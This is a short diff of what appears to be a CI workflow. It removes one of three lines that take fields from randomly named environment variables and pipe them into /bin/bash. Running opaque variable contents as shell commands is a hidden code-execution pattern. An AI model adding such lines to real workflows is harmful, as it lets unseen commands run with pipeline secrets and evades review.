@@ -21,7 +21,6 @@ jobs:
         run: |
           printf '%s' "$bjdri151" | jq -r .xpgb01942 | /bin/bash
           echo $g6303 | jq -r .hs41 | /bin/bash
-          echo $p31357 | jq -r .nrq1 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
